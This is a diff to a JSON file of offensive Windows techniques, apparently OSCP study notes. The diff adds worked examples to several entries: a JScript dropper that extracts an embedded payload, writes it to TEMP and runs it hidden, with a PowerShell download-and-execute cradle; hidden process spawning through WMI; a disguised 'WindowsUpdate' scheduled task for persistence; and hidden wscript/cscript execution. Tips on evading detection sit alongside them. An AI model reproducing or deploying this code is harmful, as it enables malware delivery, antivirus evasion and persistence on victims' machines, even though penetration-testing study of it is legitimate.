@@ -67,7 +67,8 @@
         "File write fails - Check TEMP permissions",
         "Payload corrupted - Verify no encoding issues (use Base64 for binary)",
         "Still detected - Dropper code itself may be signatured"
-      ]
+      ],
+      "filled_example": "// Part 1: JScript dropper (beginning of .js file)\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar sh = new ActiveXObject(\"WScript.Shell\");\n\n// Read own file\nvar scriptPath = WScript.ScriptFullName;\nvar file = fso.OpenTextFile(scriptPath, 1);\nvar content = file.ReadAll();\nfile.Close();\n\n// Extract payload after marker\nvar marker = \"###PAYLOAD###\";\nvar payloadStart = content.indexOf(marker) + marker.length;\nvar payload = content.substring(payloadStart);\n\n// Write payload to temp file\nvar tempPath = sh.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\payload.ps1\";\nvar outFile = fso.CreateTextFile(tempPath, true);\noutFile.Write(payload);\noutFile.Close();\n\n// Execute payload\nsh.Run(tempPath, 0);\n\n// Part 2: Embedded payload (after JScript code)\nWScript.Quit();\n###PAYLOAD###\nIEX (New-Object Net.WebClient).DownloadString('http://...')"
     },
     {
       "id": "jscript-wsh-obfuscation",
@@ -133,7 +134,8 @@
         "Task Scheduler fails - Check task definition syntax",
         "COM object not available - Verify object exists on target system",
         "Still detected - Behavioral analysis may catch COM usage pattern"
-      ]
+      ],
+      "filled_example": "// Method 1: WMI Process Creation\nvar wmi = GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\");\nvar startup = wmi.Get(\"Win32_ProcessStartup\").SpawnInstance_();\nstartup.ShowWindow = 0; // Hidden\nvar process = wmi.Get(\"Win32_Process\");\nvar pid = {};\nprocess.Create(\"powershell.exe -nop -w hidden -c ...\", null, startup, pid);\n\n// Method 2: Task Scheduler\nvar schedule = new ActiveXObject(\"Schedule.Service\");\nschedule.Connect();\nvar rootFolder = schedule.GetFolder(\"\\\\\");\nvar taskDef = schedule.NewTask(0);\nvar action = taskDef.Actions.Create(0); // Execute\naction.Path = \"powershell.exe -nop -w hidden -c ...\";\nrootFolder.RegisterTaskDefinition(\"WindowsUpdate\", taskDef, 6, null, null, 3);"
     },
     {
       "id": "wscript-cscript-execution",
@@ -166,7 +168,8 @@
         "Popups appear - Use //B flag to suppress",
         "Script timeout - Increase //T value or remove timeout",
         "Encoding issues - Save as ANSI/ASCII, not UTF-8 with BOM"
-      ]
+      ],
+      "filled_example": "# Execute with WScript (GUI mode, hidden)\nwscript.exe //B //Nologo payload.js\n\n# Execute with CScript (console mode)\ncscript.exe //B //Nologo payload.js\n\n# Force hidden execution (WScript)\nwscript.exe //B //Nologo payload.js\n\n# Within script, check execution mode:\nvar isConsole = (WScript.FullName.toLowerCase().indexOf(\"cscript\") != -1);"
     }
   ],
   "oscp_relevance": "Useful for alternative execution methods when PowerShell blocked. JScript often less monitored than PowerShell. Good for VBA -> JScript -> PowerShell attack chains.",
